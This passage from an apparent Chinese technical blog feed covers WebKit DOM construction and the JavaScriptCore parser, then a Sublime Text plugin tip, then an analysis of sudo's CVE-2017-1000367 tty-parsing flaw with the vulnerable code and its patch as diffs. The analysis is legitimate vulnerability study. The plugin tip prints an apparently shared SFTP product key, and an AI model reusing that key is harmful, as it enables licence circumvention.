alt="processToken"><br>&#x8FD9;&#x91CC;&#x4F1A;&#x5BF9;token&#x8FDB;&#x884C;&#x5206;&#x7C7B;&#xFF0C;WebKit&#x5BF9;&#x5176;&#x4E00;&#x5171;&#x5206;&#x4E3A;&#x4E86;6&#x7C7B;&#xFF0C;&#x5047;&#x8BBE;&#x8FD9;&#x91CC;&#x4E3A;StartTag&#xFF0C;&#x5219;&#x8FDB;&#x5165;processStartTag&#x51FD;&#x6570;&#x8FDB;&#x4E00;&#x6B65;&#x5904;&#x7406;&#xFF0C;&#x7136;&#x540E;&#x4F9D;&#x636E;&#x8BE5;token&#x9700;&#x8981;&#x63D2;&#x5165;&#x7684;&#x4F4D;&#x7F6E;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x8C03;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x51FD;&#x6570;&#x5904;&#x7406;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;head&#x4E4B;&#x524D;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x4E00;&#x6B65;&#x5224;&#x65AD;&#x662F;html&#x6807;&#x7B7E;&#x6216;&#x662F;head&#x6807;&#x7B7E;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x7B80;&#x5355;&#x5206;&#x6790;&#xFF0C;&#x5047;&#x8BBE;&#x8FDB;&#x5165;&#x7684;token&#x662F;&#x4E00;&#x4E2A;body&#x6807;&#x7B7E;&#x3002;<br>&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x8FDB;&#x5165;AfterHead&#x5206;&#x652F;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x4E00;&#x6B65;&#x8C03;&#x7528;m_tree.insertHTMLBodyElement(WTFMove(token));&#x8FDB;&#x4E00;&#x6B65;&#x5904;&#x7406;&#x3002;<br><img src="/images/WebKit-code/8.PNG" alt="bodyTag"><br>&#x8FD9;&#x91CC;m_tree&#x662F;&#x4E00;&#x4E2A;HTMLConstructionSite&#x7C7B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x56E0;&#x6B64;&#x5C06;&#x4F1A;&#x7531;HTMLConstructionSite&#x8FDB;&#x884C;&#x8282;&#x70B9;&#x5BF9;&#x8C61;&#x7684;&#x521B;&#x5EFA;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;body&#x5C06;&#x4F1A;&#x8C03;&#x7528;body&#x7684;&#x521B;&#x5EFA;&#x4E0E;&#x63D2;&#x5165;&#x3002;&#x5728;HTMLConstructionSite&#x7C7B;&#x4E2D;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5BF9;&#x5F88;&#x591A;&#x4E0D;&#x540C;&#x7684;&#x5143;&#x7D20;&#x90FD;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x51FD;&#x6570;&#x6765;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;<br><img src="/images/WebKit-code/9.PNG" alt="HTMLConstructionSite"><br>&#x8FD9;&#x91CC;&#x662F;&#x5BF9;body&#x5904;&#x7406;&#xFF0C;&#x9996;&#x5148;&#x662F;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;body&#x5143;&#x7D20;&#x5BF9;&#x5E94;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x7136;&#x540E;m_openElements.pushHTMLBodyElement&#xFF0C;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x662F;&#x7EF4;&#x62A4;&#x4E86;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x6808;&#xFF0C;m_openElements&#x662F;HTMLElementStack&#x7C7B;&#x7684;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF1B;&#x8FD9;&#x91CC;&#x7684;&#x5143;&#x7D20;&#x662F;&#x5F53;&#x524D;&#x6709;&#x5F00;&#x59CB;&#x6807;&#x8BC6;&#x4F46;&#x662F;&#x8FD8;&#x6CA1;&#x6709;&#x7ED3;&#x675F;&#x6807;&#x8BC6;&#x7684;&#x5143;&#x7D20;&#x8282;&#x70B9;&#x3002;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x5F62;&#x8C61;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;(WebKit&#x6280;&#x672F;&#x5185;&#x5E55; P113)<br>&#x5F53;HTML&#x5305;&#x542B;&#x6807;&#x7B7E;&#x7247;&#x6BB5;&#xFF1A;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4F9D;&#x6B21;&#x9047;&#x5230;&#x5F00;&#x59CB;&#x6807;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x4F9D;&#x6B21;&#x538B;&#x6808;&#xFF0C;&#x5F53;&#x201D;img&#x201D;&#x5904;&#x7406;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x9047;&#x5230;&#x201D;/img&#x201D;&#x7ED3;&#x675F;&#x6807;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x51FA;&#x6808;&#xFF0C;img&#x5143;&#x7D20;&#x5C31;&#x662F;div&#x5143;&#x7D20;&#x7684;&#x5B50;&#x8282;&#x70B9;&#xFF1B;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002;<p></p><h2 id="JavaScript-&#x89E3;&#x6790;&#x5F15;&#x64CE;"><a href="#JavaScript-&#x89E3;&#x6790;&#x5F15;&#x64CE;" class="headerlink" title="JavaScript &#x89E3;&#x6790;&#x5F15;&#x64CE;"></a>JavaScript &#x89E3;&#x6790;&#x5F15;&#x64CE;</h2><p>JS&#x5F15;&#x64CE;&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;WebKit&#x9ED8;&#x8BA4;&#x7684;JSC(JavaScriptCore)&#xFF0C;&#x7528;&#x4E8E;Safari&#x91CC;&#x9762;(&#x672A;&#x9A8C;&#x8BC1;)&#xFF1B;&#x4E00;&#x4E2A;&#x662F;JS V8&#xFF0C;&#x7528;&#x4E8E;Chrome&#x91CC;&#x9762;&#x3002;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x7684;&#x662F;&#x9ED8;&#x8BA4;&#x7684;JS&#x5F15;&#x64CE;JSC&#x3002;</p><h3 id="JSC&#x5904;&#x7406;&#x7684;&#x57FA;&#x672C;&#x6D41;&#x7A0B;"><a href="#JSC&#x5904;&#x7406;&#x7684;&#x57FA;&#x672C;&#x6D41;&#x7A0B;" class="headerlink" title="JSC&#x5904;&#x7406;&#x7684;&#x57FA;&#x672C;&#x6D41;&#x7A0B;"></a>JSC&#x5904;&#x7406;&#x7684;&#x57FA;&#x672C;&#x6D41;&#x7A0B;</h3><p>&#x57FA;&#x672C;&#x7ED3;&#x6784;&#x548C;&#x4E00;&#x822C;&#x7684;&#x7A0B;&#x5E8F;&#x8BED;&#x8A00;&#x7F16;&#x8BD1;&#x89E3;&#x91CA;&#x5668;&#x7C7B;&#x4F3C;&#x3002;&#x5176;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src="/images/WebKit-code/10.png" alt="JSC"></p><h3 id="&#x5BF9;&#x5E94;JSC&#x7684;&#x6E90;&#x4EE3;&#x7801;"><a href="#&#x5BF9;&#x5E94;JSC&#x7684;&#x6E90;&#x4EE3;&#x7801;" class="headerlink" title="&#x5BF9;&#x5E94;JSC&#x7684;&#x6E90;&#x4EE3;&#x7801;"></a>&#x5BF9;&#x5E94;JSC&#x7684;&#x6E90;&#x4EE3;&#x7801;</h3><p>JSC&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x5728;/Source/JavaScriptCore&#x6587;&#x4EF6;&#x5939;&#x91CC;<br>&#x5F00;&#x59CB;&#x5728;Parser.cpp&#x4E2D;&#xFF0C;&#x5305;&#x542B;&#x7684;&#x51E0;&#x4E2A;&#x5173;&#x952E;&#x7684;&#x53D8;&#x91CF;&#xFF1A;m_lexer&#xFF0C;&#x7528;&#x4E8E;&#x8BCD;&#x6CD5;&#x5206;&#x6790;&#x5668;&#x8C03;&#x7528;&#xFF0C;&#x5C06;&#x5B57;&#x7B26;&#x5E8F;&#x5217;&#x8F6C;&#x6210;token&#x5E8F;&#x5217;&#xFF0C;&#x5728;Lexer.cpp&#x4E2D;&#x5B9E;&#x73B0;<br>&#x8FDB;&#x5165;&#x89E3;&#x6790;&#x7684;&#x5165;&#x53E3;&#x51FD;&#x6570;&#xFF0C;Parser<lexertype>::Parser<br><img src="/images/WebKit-code/11.PNG" alt="JSC-Parser"><br>&#x5176;&#x4E2D;source&#x662F;&#x8F93;&#x5165;&#x7684;JS&#x4EE3;&#x7801;&#xFF0C;&#x6E90;&#x5B57;&#x7B26;&#x4E32;</lexertype></p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p>WebKit&#x6280;&#x672F;&#x5185;&#x5E55;<br>WebKit&#x5F00;&#x6E90;&#x4EE3;&#x7801;(&#x6700;&#x540E;&#x4FEE;&#x6539;: 2017-09-03  Sam Weinig)<br>WebKit vulnerability from 0 to 1 (KCon 2017)</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> browser </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Plugins</title>
      <link href="/2017/09/12/sublime-plugin/"/>
      <url>/2017/09/12/sublime-plugin/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="Disable-Update"><a href="#Disable-Update" class="headerlink" title="Disable Update"></a>Disable Update</h3><p>Preferences -&gt; setting -&gt; user-setting &#x5199;&#x5165;<br>{<br>    &#x201C;update_check&#x201D;: false<br>}</p><h3 id="SFTP"><a href="#SFTP" class="headerlink" title="SFTP"></a>SFTP</h3><p>&#x53EF;&#x4EE5;&#x5728;&#x672C;&#x5730;&#x7F16;&#x5199;&#x4EE3;&#x7801;&#x90E8;&#x7F72;&#x5230;&#x8FDC;&#x7A0B;&#x673A;&#x5668;&#x4E0A;&#x8FD0;&#x884C;<br><a href="https://wbond.net/sublime_packages/sftp/installation" target="_blank" rel="noopener">https://wbond.net/sublime_packages/sftp/installation</a><br>&#x6CE8;&#x610F;Windows&#x4E0B;&#x7684;remote_path&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x5982;&#x679C;&#x662F; c:\11&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x5219;&#x5E94;&#x8BE5;&#x662F;/cygdrive/c/11</p><p>Preferences -&gt; Package Setting -&gt; SFTP -&gt; user-setting<br>&#x6CE8;&#x518C;&#x7801;&#xFF1A;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;xiaosong@xiaosong.me&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;product_key&quot;</span>: <span class="hljs-string">&quot;d419f6-de89e9-0aae59-2acea1-07f92a&quot;</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br><a href="http://www.cnblogs.com/jiqing9006/p/5558516.html" target="_blank" rel="noopener">http://www.cnblogs.com/jiqing9006/p/5558516.html</a><p></p><h3 id="Djaneiro"><a href="#Djaneiro" class="headerlink" title="Djaneiro"></a>Djaneiro</h3><p>Django&#x6A21;&#x5757;&#x548C;&#x5173;&#x952E;&#x5B57;&#x9AD8;&#x4EAE;&#x63D2;&#x4EF6;<br><a href="https://packagecontrol.io/packages/Djaneiro" target="_blank" rel="noopener">https://packagecontrol.io/packages/Djaneiro</a></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FileSystemWatcher</title>
      <link href="/2017/06/06/FileSystemWatcher/"/>
      <url>/2017/06/06/FileSystemWatcher/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p><a href="http://www.cnblogs.com/zhaojingjing/archive/2011/01/21/1941586.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhaojingjing/archive/2011/01/21/1941586.html</a></p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-1000367 分析与复现</title>
      <link href="/2017/06/06/CVE-2017-1000367/"/>
      <url>/2017/06/06/CVE-2017-1000367/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x662F;&#x5728;5.30&#x53F7;&#x6B63;&#x5F0F;&#x516C;&#x5E03;&#x7684;&#xFF0C;&#x56FD;&#x5185;&#x6709;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#x6709;&#x5173;&#x4E8E;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684;&#x9884;&#x8B66;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4ECB;&#x7ECD;&#x4E0B;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#xFF0C;&#x7248;&#x672C;&#x4E4B;&#x7C7B;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x800C;&#x4E14;&#x57FA;&#x672C;&#x90FD;&#x662F;&#x4E00;&#x4EFD;&#x7684;&#x5404;&#x79CD;&#x8F6C;&#x8F7D;&#x3002;&#x5728;freebuf&#x4E0A;&#x6709;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x8BE6;&#x7EC6;&#x7684;&#x4ECB;&#x7ECD;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x4E3B;&#x8981;&#x662F;&#x4EE5;&#x7FFB;&#x8BD1;&#x4E3A;&#x4E3B;&#xFF0C;&#x5E76;&#x672A;&#x8BB2;&#x7684;&#x5F88;&#x900F;&#x5F7B;&#x3002;<br><a href="http://www.freebuf.com/vuls/136156.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/136156.html</a></p><p>&#x56E0;&#x6B64;&#x51C6;&#x5907;&#x5BF9;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x5206;&#x6790;&#xFF0C;&#x5E76;&#x4F9D;&#x636E;github&#x4E0A;&#x516C;&#x5E03;&#x7684;PoC&#x5BF9;&#x8BE5;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x3002;<br>&#x4E3B;&#x8981;&#x89E3;&#x51B3;&#x4E24;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;</p><ol><li>&#x9020;&#x6210;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x56E0;&#x662F;&#x4EC0;&#x4E48;? &#x8865;&#x4E01;&#x5982;&#x4F55;&#x4FEE;&#x8865;</li><li>&#x5229;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x600E;&#x6837;&#x7684;&#x6548;&#x679C;</li></ol><h3 id="&#x6F0F;&#x6D1E;&#x6210;&#x56E0;&#x4E0E;&#x8865;&#x4E01;&#x4FEE;&#x590D;"><a href="#&#x6F0F;&#x6D1E;&#x6210;&#x56E0;&#x4E0E;&#x8865;&#x4E01;&#x4FEE;&#x590D;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x6210;&#x56E0;&#x4E0E;&#x8865;&#x4E01;&#x4FEE;&#x590D;"></a>&#x6F0F;&#x6D1E;&#x6210;&#x56E0;&#x4E0E;&#x8865;&#x4E01;&#x4FEE;&#x590D;</h3><p>&#x539F;&#x56E0;&#x662F;&#x5728;Linux&#x6267;&#x884C;sudo&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x8FDB;&#x7A0B;&#x7684;tty&#x8BBE;&#x5907;&#x53F7;&#xFF0C;&#x800C;&#x83B7;&#x53D6;&#x7684;&#x5730;&#x65B9;&#x662F;&#x5728;/proc/[pid]/stat&#x6587;&#x4EF6;&#x4E0B;&#x3002;stat&#x6587;&#x4EF6;&#x7684;&#x8BE6;&#x7EC6;&#x63CF;&#x8FF0;&#x5728;<a href="http://blog.csdn.net/cybertan/article/details/7596633" target="_blank" rel="noopener">http://blog.csdn.net/cybertan/article/details/7596633</a> &#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x4E2D;&#x6709;&#x5F88;&#x8BE6;&#x7EC6;&#x7684;&#x63CF;&#x8FF0;&#x3002;<br>&#x5176;&#x4E2D;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x5173;&#x7CFB;&#x7684;&#x662F;&#x4E24;&#x70B9;&#xFF0C;&#x4E00;&#x662F;&#x8FD9;&#x91CC;&#x9762;&#x7684;&#x503C;&#x90FD;&#x662F;&#x4E00;&#x9879;&#x4E00;&#x9879;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x6BCF;&#x4E00;&#x9879;&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x7A7A;&#x683C;&#x8FDB;&#x884C;&#x5206;&#x9694;&#x5F00;&#x3002;<br>&#x4E8C;&#x662F;&#x7B2C;&#x4E8C;&#x9879;&#x8868;&#x793A; &#x5E94;&#x7528;&#x7A0B;&#x5E8F;(&#x8FDB;&#x7A0B;)&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x662F;&#x7528;&#x5C0F;&#x62EC;&#x53F7;&#x5305;&#x542B;&#xFF0C;&#x5E76;&#x4E14;&#x5141;&#x8BB8;&#x7A7A;&#x683C;&#x7684;&#x5B58;&#x5728;&#xFF1B;&#x7B2C;&#x4E03;&#x9879;&#x662F;tty_nr&#xFF0C;&#x5C31;&#x662F;&#x524D;&#x9762;&#x63D0;&#x5230;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x7684;tty&#x8BBE;&#x5907;&#x53F7;&#x3002;<br>&#x6F0F;&#x6D1E;&#x6210;&#x56E0;&#x5C31;&#x5728;&#x83B7;&#x53D6;tty&#x8BBE;&#x5907;&#x53F7;&#x7684;&#x65F6;&#x5019;&#xFF1A;<br><a href="https://bugzilla.redhat.com/attachment.cgi?id=1282109" target="_blank" rel="noopener">https://bugzilla.redhat.com/attachment.cgi?id=1282109</a> (&#x8865;&#x4E01;&#x524D;&#x540E;&#x5BF9;&#x6BD4;&#x7684;&#x4EE3;&#x7801;)<br>&#x4F7F;&#x7528;&#x7684;&#x51FD;&#x6570;&#x4E3A;get_process_ttyname&#xFF0C;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> len = getline(&amp;<span class="hljs-built_in">line</span>, &amp;linesize, fp);</span><br><span class="line"> fclose(fp);</span><br><span class="line"> <span class="hljs-keyword">if</span> (len != <span class="hljs-number">-1</span>) {</span><br><span class="line">-    <span class="hljs-comment">/* Field 7 is the tty dev (0 if no tty) */</span></span><br><span class="line">-    <span class="hljs-keyword">char</span> *cp = <span class="hljs-built_in">line</span>;</span><br><span class="line">-    <span class="hljs-keyword">char</span> *ep = <span class="hljs-built_in">line</span>;</span><br><span class="line">-    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr;</span><br><span class="line">-    <span class="hljs-keyword">int</span> field = <span class="hljs-number">0</span>;</span><br><span class="line">-    <span class="hljs-keyword">while</span> (*++ep != <span class="hljs-string">&apos;\0&apos;</span>) {</span><br><span class="line">-<span class="hljs-keyword">if</span> (*ep == <span class="hljs-string">&apos; &apos;</span>) {</span><br><span class="line">-    *ep = <span class="hljs-string">&apos;\0&apos;</span>;</span><br><span class="line">-    <span class="hljs-keyword">if</span> (++field == <span class="hljs-number">7</span>) {</span><br><span class="line">-<span class="hljs-keyword">dev_t</span> tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;errstr);</span><br><span class="line">-<span class="hljs-keyword">if</span> (errstr) {</span><br><span class="line">-    sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,</span><br><span class="line">-<span class="hljs-string">&quot;%s: tty device %s: %s&quot;</span>, path, cp, errstr);</span><br><span class="line">[......]</span><br><span class="line">-    cp = ep + <span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x57FA;&#x672C;&#x6D41;&#x7A0B;&#x4E3A;&#x4ECE; stat&#x6587;&#x4EF6;&#x4E0B;&#x8BFB;&#x53D6;&#x4E00;&#x884C;(tty&#x8BBE;&#x5907;&#x53F7;&#x5728;&#x7B2C;&#x4E00;&#x884C;)&#xFF0C;&#x7136;&#x540E;&#x6309;&#x7167;&#x7A7A;&#x683C;&#x53D6;&#x503C;&#xFF0C;&#x5F53;&#x9047;&#x5230;&#x7B2C;&#x4E03;&#x4E2A;&#x7A7A;&#x683C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x90A3;&#x4E48;&#x524D;&#x9762;&#x90A3;&#x4E2A;&#x8BB0;&#x5F55;&#x7684;cp&#x6307;&#x9488;&#x6307;&#x5411;&#x7684;&#x5C31;&#x662F;tty&#x8BBE;&#x5907;&#x53F7;&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x5176;&#x62FF;&#x51FA;&#x6765;&#x5373;&#x53EF;&#x83B7;&#x53D6;&#x3002;&#x800C;&#x6210;&#x529F;&#x7684;&#x524D;&#x63D0;&#x5728;&#x4E8E;&#x524D;&#x9762;&#x53EA;&#x6709;&#x7528;&#x4E8E;&#x5206;&#x9694;&#x7684;&#x7A7A;&#x683C;&#xFF0C;&#x9879;&#x4E2D;&#x662F;&#x6CA1;&#x6709;&#x7A7A;&#x683C;&#x7684;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x9879;&#x7684;&#x8FDB;&#x7A0B;&#x540D;&#x4E2D;&#x662F;&#x5141;&#x8BB8;&#x5305;&#x542B;&#x7A7A;&#x683C;&#x7684;&#xFF0C;&#x800C;&#x8FD9;&#x4E00;&#x9879;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7684;&#x3002;<br>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7ED9;&#x7B2C;&#x4E8C;&#x9879;&#x6DFB;&#x52A0;&#x7A7A;&#x683C;&#xFF0C;&#x6765;&#x63A7;&#x5236;&#x7B2C;&#x4E03;&#x9879;&#x7684;&#x503C;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x968F;&#x610F;&#x63A7;&#x5236;tty&#x8BBE;&#x5907;&#x53F7;&#x3002;&#x8FD9;&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x70B9;&#x6240;&#x5728;&#x3002;<br>&#x6240;&#x4EE5;&#x5BF9;&#x5E94;&#x7684;&#x8865;&#x4E01;&#x5C31;&#x4FEE;&#x8865;&#x4E86;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;&#xFF1A;<p></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">+     * Field 7 is the tty dev (0 if no tty).</span></span><br><span class="line"><span class="hljs-comment">+     * Since the process name at field 2 &quot;(comm)&quot; may include spaces,</span></span><br><span class="line"><span class="hljs-comment">+     * start at the last &apos;)&apos; found.</span></span><br><span class="line"><span class="hljs-comment">+     */</span></span><br><span class="line">+    <span class="hljs-keyword">char</span> *cp = <span class="hljs-built_in">strrchr</span>(<span class="hljs-built_in">line</span>, <span class="hljs-string">&apos;)&apos;</span>);</span><br><span class="line">+    <span class="hljs-keyword">if</span> (cp != <span class="hljs-literal">NULL</span>) {</span><br><span class="line">+<span class="hljs-keyword">char</span> *ep = cp;</span><br><span class="line">+<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr;</span><br><span class="line">+<span class="hljs-keyword">int</span> field = <span class="hljs-number">1</span>;</span><br><span class="line">+</span><br><span class="line">+<span class="hljs-keyword">while</span> (*++ep != <span class="hljs-string">&apos;\0&apos;</span>) {</span><br><span class="line">+    <span class="hljs-keyword">if</span> (*ep == <span class="hljs-string">&apos; &apos;</span>) {</span><br><span class="line">+*ep = <span class="hljs-string">&apos;\0&apos;</span>;</span><br><span class="line">+<span class="hljs-keyword">if</span> (++field == <span class="hljs-number">7</span>) {</span><br><span class="line">+    <span class="hljs-keyword">dev_t</span> tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;errstr);</span><br><span class="line">+    <span class="hljs-keyword">if</span> (errstr) {</span><br><span class="line">+sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,</span><br><span class="line">+    <span class="hljs-string">&quot;%s: tty device %s: %s&quot;</span>, path, cp, errstr);</span><br><span class="line">+    }</span><br><span class="line">+    <span class="hljs-keyword">if</span> (tdev &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">+errno = serrno;</span><br><span class="line">+ret = sudo_ttyname_dev(tdev, name, namelen);</span><br><span class="line">+<span class="hljs-keyword">goto</span> done;</span><br><span class="line">+    }</span><br><span class="line">+    <span class="hljs-keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4E3B;&#x8981;&#x7684;&#x6DFB;&#x52A0;&#x4EE3;&#x7801;&#xFF0C;&#x5728;&#x5BF9;&#x7B2C;&#x4E03;&#x9879;&#x7684;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x8FDB;&#x7A0B;&#x540D;&#x9879;&#x4F7F;&#x7528;&#x5C0F;&#x62EC;&#x53F7;&#x5305;&#x7740;&#x7684;&#x7279;&#x70B9;&#xFF0C;&#x4ECE;&#x2019;)&#x2019;&#x5F80;&#x540E;&#x5F00;&#x59CB;&#x67E5;&#x8BE2;&#x3002;<p></p><p>&#x770B;&#x5230;&#x524D;&#x9762;&#x94FE;&#x63A5;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5176;&#x5B9E;&#x8FD8;&#x8865;&#x4E86;&#x53E6;&#x5916;&#x4E00;&#x5904;&#xFF1A;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *ignore_devs[] = {</span><br><span class="line">     <span class="hljs-string">&quot;/dev/fd/&quot;</span>,</span><br><span class="line">+    <span class="hljs-string">&quot;/dev/mqueue/&quot;</span>,</span><br><span class="line">+    <span class="hljs-string">&quot;/dev/shm/&quot;</span>,</span><br><span class="line">     <span class="hljs-string">&quot;/dev/stdin&quot;</span>,</span><br><span class="line">     <span class="hljs-string">&quot;/dev/stdout&quot;</span>,</span><br><span class="line">     <span 